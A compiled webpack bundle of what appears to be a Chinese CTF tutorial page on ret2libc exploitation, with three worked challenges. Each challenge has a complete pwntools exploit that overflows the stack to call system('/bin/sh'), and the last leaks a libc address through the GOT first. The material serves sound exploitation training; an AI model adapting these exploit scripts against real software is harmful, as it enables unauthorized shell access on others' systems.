(window.webpackJsonp=window.webpackJsonp||[]).push([[63],{810:function(s,t,a){"use strict";a.r(t);var n=a(79),r=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"原理"}},[s._v("原理 "),t("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[s._v("#")])]),s._v(" "),t("p",[s._v("ret2lic即劫持程序的控制流，使其执行libc中的函数，一般是返回到某个函数的plt处，或者某个函数的具体位置（函数对应got表的内容），大多情况下是执行system('/bin/sh')。")]),s._v(" "),t("h2",{attrs:{id:"例题1"}},[s._v("例题1 "),t("a",{staticClass:"header-anchor",attrs:{href:"#例题1"}},[s._v("#")])]),s._v(" "),t("p",[s._v("题目下载链接：https://pan.baidu.com/s/1DzkmINus__xu3_qkwoIPwQ 提取码：0000")]),s._v(" "),t("p",[s._v("首先查看一下程序开了哪些安全保护")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/1.png",alt:"image-20210105202149700"}})]),s._v(" "),t("p",[s._v("程序是小端序32位，开了NX防护。接着使用ida查看一下程序")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/2.png",alt:"image-20210105202739929"}})]),s._v(" "),t("p",[s._v("程序有明显的栈溢出，在plt表中发现有system函数的地址和/bin/sh字符串")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/3.png",alt:"image-20210105203242739"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/4.png",alt:"image-20210105203513119"}})]),s._v(" "),t("p",[s._v("通过gdb调试确定字符串s的地址离ebp有多少字节，直接通过ida也能确定需要填充多少字符,，不过动态调试结果比较准")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/5.png",alt:"image-20210105203911307"}})]),s._v(" "),t("p",[s._v("最后的exp如下：")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\ncontext"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("\np "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" process"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2libc1'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2libc1'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nsys_addr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nbin_sh "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("search"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/bin/sh'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("next")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" cyclic"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x70")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bin_sh"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br")])]),t("h2",{attrs:{id:"例题2"}},[s._v("例题2 "),t("a",{staticClass:"header-anchor",attrs:{href:"#例题2"}},[s._v("#")])]),s._v(" "),t("p",[s._v("题目下载链接：https://pan.baidu.com/s/1I9IOqD3Jq6RrghlUNL0wsg  提取码：0000")]),s._v(" "),t("p",[s._v("这道题与例题1基本相似，只是程序中没有了/bin/sh字符串，我们需要通过gets函数手动写入/bin/sh字符串到一个可写可执行区域，通常在bss段，在ida找到一个地址")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/6.png",alt:"image-20210105205900389"}})]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\ncontext"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("\np "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" process"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2libc2'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2libc2'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nsys_addr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\ngets_addr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'gets'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nbss_addr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0804A080")]),s._v("\n\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" cyclic"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x70")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("gets_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bss_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bss_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/bin/sh'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br")])]),t("h2",{attrs:{id:"例题3"}},[s._v("例题3 "),t("a",{staticClass:"header-anchor",attrs:{href:"#例题3"}},[s._v("#")])]),s._v(" "),t("p",[s._v("题目下载链接：https://pan.baidu.com/s/1wk3JFQBHgVZ0vjfnQk60Ug  提取码：0000")]),s._v(" "),t("p",[s._v("例题3相对于前面两道例题难度加大了不少，程序中既没有system函数的地址，也没有/bin/sh字符串，我们需要使用libc中的system函数和/bin/sh，题目已经将libc版本给了出来，这时需要泄露libc某个函数的地址。")]),s._v(" "),t("p",[s._v("先使用ida查看程序")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/7.png",alt:"image-20210105213153494"}})]),s._v(" "),t("p",[s._v("主函数中并没有产生溢出，但有两个可以的函数，跟进去看看")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/8.png",alt:"image-20210105213403543"}})]),s._v(" "),t("p",[s._v("See_something函数是打印给定地址的值，可以通过这个漏洞函数可以泄露libc函数的地址")]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/ret2libc/9.png",alt:"image-20210105213622064"}})]),s._v(" "),t("p",[s._v("Print_message函数的字符串拷贝存在栈溢出，又main函数可知src字符串长度最多可达256，远超过56。由于在libc中各函数地址的偏移是固定的，通过泄露出某个函数的真实地址，再减去该函数在libc中的地址就能得到libc函数中加载到内存的基址，这样就能计算出system函数和/bin/sh的地址。")]),s._v(" "),t("p",[s._v("exp如下：")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\ncontext"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("\np "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" process"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2libc3'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2libc3'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./libc-2.23.so'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'(in dec) :'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("elf"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'puts'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nputs_addr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" p"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/n'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" drop "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("True")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'for me :'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nlibc_base "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("int")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("puts_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" libc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'puts'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nsys_addr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" libc_base "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" libc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nbin_sh "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" libc_base "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" libc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("search"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/bin/sh'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("next")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" cyclic"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x3c")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bin_sh"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br")])]),t("h2",{attrs:{id:"总结"}},[s._v("总结 "),t("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")])]),s._v(" "),t("p",[s._v("实际上大部分题都需要我们自己获得system函数的地址，通常是通过libc的延迟绑定机制，泄露出已经执行过的函数的地址，而libc中的函数之间的相对偏移是固定的，有时候还需要返回到main函数或其他函数多次构造payload进行利用。")])])}),[],!1,null,null,null);t.default=r.exports}}]);